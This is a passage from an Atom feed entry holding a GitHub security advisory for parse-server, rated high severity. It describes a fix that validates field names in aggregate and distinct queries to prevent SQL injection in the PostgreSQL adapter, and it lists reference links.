<p>Field names in the aggregate <code>$group._id</code> object values and <code>distinct</code> dot-notation parameters are now validated to only contain alphanumeric characters and underscores, preventing SQL injection via the <code>:raw</code> interpolation used in the PostgreSQL storage adapter.</p>
<h3 id="workarounds">Workarounds</h3>
<p>No workaround. Upgrade to a patched version.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/parse-community/parse-server/security/advisories/GHSA-p2w6-rmh7-w8q3">https://github.com/parse-community/parse-server/security/advisories/GHSA-p2w6-rmh7-w8q3</a></li>
<li><a href="https://github.com/parse-community/parse-server/pull/10272">https://github.com/parse-community/parse-server/pull/10272</a></li>
<li><a href="https://github.com/parse-community/parse-server/pull/10273">https://github.com/parse-community/parse-server/pull/10273</a></li>
<li><a href="https://github.com/advisories/GHSA-p2w6-rmh7-w8q3">https://github.com/advisories/GHSA-p2w6-rmh7-w8q3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p2w6-rmh7-w8q3</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-24T19:12:06.000Z</published>
    </entry>
</feed>